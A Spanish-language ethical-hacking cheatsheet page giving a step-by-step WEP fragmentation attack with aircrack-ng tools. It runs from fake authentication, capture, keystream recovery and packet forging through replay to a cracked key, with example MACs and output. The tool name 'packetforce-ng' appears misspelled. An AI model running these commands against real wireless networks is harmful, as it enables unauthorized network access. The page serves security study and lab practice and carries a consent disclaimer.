
# Fragmentation

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

{% hint style="info" %}
Debemos ejecutar esta técnica hasta lograr los suficientes IVs para crackear la llave
{% endhint %}

## <mark style="color:purple;">**Ataque de Fragmentación**</mark>

* En una red Wi-Fi que utiliza WEP para la seguridad, los paquetes de datos se dividen en fragmentos más pequeños antes de ser transmitidos.
* El ataque de fragmentación implica manipular estos fragmentos para explotar debilidades en la implementación de WEP.
* Usando este método debemos obtener 1500 bytes del PRGA.

## <mark style="color:purple;">Proceso</mark>

* **Identificación de IV débil:** El atacante monitorea el tráfico de la red para identificar un flujo de paquetes cifrados con una clave WEP.
* **Solicitud de desautenticación:** El atacante envía un paquete de desautenticación al cliente para forzarlo a reconectarse y generar nuevos vectores de inicialización (IV).
* **Ataque de fragmentación:** El atacante envía fragmentos manipulados para explotar debilidades en la implementación WEP. Esto puede incluir fragmentos más cortos que los que se esperan.

### 1. Partimos de un Fake Auth

{% content-ref url="/pages/hoxQMW9xIUWd61KaAfVg" %}
[Fake Autentication](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-redes/hacking-wifi/wep-cracking/fake-autentication.md)
{% endcontent-ref %}

### 2. Iniciar airodump-ng

Debemos guardar la salida con `--write`

```bash
# 4 - Iniciamos airodump-ng y guardamos la salida
sudo airodump-ng --bssid 00:E0:4C:6A:5A:F8 --channel 11 --write fragment_injection wlan0
```

### 3. Aireplay --fragment

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
   >> --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --fragment -b <SSID-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

```bash
sudo aireplay-ng --fragment -b 00:E0:AC:6A:5A:F8 -h E8:4E:06:35:A9:C0 wlan0mon 
```

<figure><img src="/files/oIEOuEir0eTZsV9wqgqm" alt=""><figcaption></figcaption></figure>

Al final obtendremos el keystream en un archivo `.xor`

### 4. Iniciar packetforce

{% code overflow="wrap" %}

```bash
sudo packetforce-ng -0 -a <MAC-OBJETIVO> -h <MAC-ADAPTADOR> -k <MASCARA> -l <MASCARA> -y <.XOR> -w <SALIDA>
```

{% endcode %}

{% code overflow="wrap" %}

```bash
sudo packetforce-ng -0 -a 00:E0:AC:6A:5A:F8 -h E8:4E:06:35:A9:C0 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1130-212229.xor -w fragment_attack

Wrote packet to: fragment_attack

ls
fragment_attack
```

{% endcode %}

### 5. Aireplay --interactive

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
   >> --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --interactive -r fragment_attack wlan0mon
```

<figure><img src="/files/4PphFrsP4IEhD1xKB5Kf" alt=""><figcaption></figcaption></figure>

Vemos que aumenta el tráfico correctamente en airodump:

<figure><img src="/files/BBtHDZwOCxO9DQxKPNWJ" alt=""><figcaption></figcaption></figure>

### 6. Iniciar aircrack-ng

Abrir el archivo .cap

```bash
sudo aircrack-ng fragment_injection.cap
```

<figure><img src="/files/GagIghpdIi1UWufg0B0m" alt=""><figcaption></figcaption></figure>

```
KEY FOUND! [12:34:56:78:90]
Password: 1234567890
```
